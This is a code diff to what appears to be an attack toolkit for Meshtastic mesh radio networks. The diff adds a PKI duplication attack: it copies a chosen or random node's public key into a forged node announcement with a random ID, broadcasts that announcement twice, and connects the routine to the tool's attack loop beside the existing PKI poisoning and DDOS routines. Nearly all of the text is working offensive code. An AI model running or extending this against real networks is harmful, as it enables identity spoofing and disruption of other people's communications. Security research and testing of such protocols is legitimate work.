@@ -119,6 +119,34 @@ void TMAttack::atkPkiPoison() {
     sendDebugMessage("Sent PKI poison for node 0x" + std::to_string(srcnode));
 }
 
+void TMAttack::atkPkiDupe() {
+    uint32_t srcnode = target;
+    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
+        srcnode = getRandomTarget();
+        if (srcnode == 0) {
+            sendDebugMessage("No valid target found for PKI duplication attack.");
+            return;  // no valid target found
+        }
+    }
+    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    if (!node) {
+        sendDebugMessage("No valid target found for PKI duplication attack.");
+        return;  // no valid target found
+    }
+    uint32_t dupenodeid = esp_random();
+    MC_NodeInfo nodeinfo = {};  // new node
+    std::string none = "";
+    std::string none2 = "";
+    uint8_t hw_model = esp_random() % 105;
+    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, dupenodeid, none, none2, hw_model);
+    for (int i = 0; i < 32; i++) {
+        nodeinfo.public_key[i] = node->public_key[i];  // dupe target key
+    }
+    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
+    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
+    sendDebugMessage("Sent PKI dupe as node 0x" + std::to_string(srcnode));
+}
+
 void TMAttack::atkRndNode() {
     // Generate random latitude and longitude within specified bounds
     double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
@@ -180,5 +208,7 @@ void TMAttack::loop() {
         atkPkiPoison();
     } else if (current_attack == AttackType::DDOS) {
         atkDdos();
+    } else if (current_attack == AttackType::PKI_DUPE) {
+        atkPkiDupe();
     }
 }
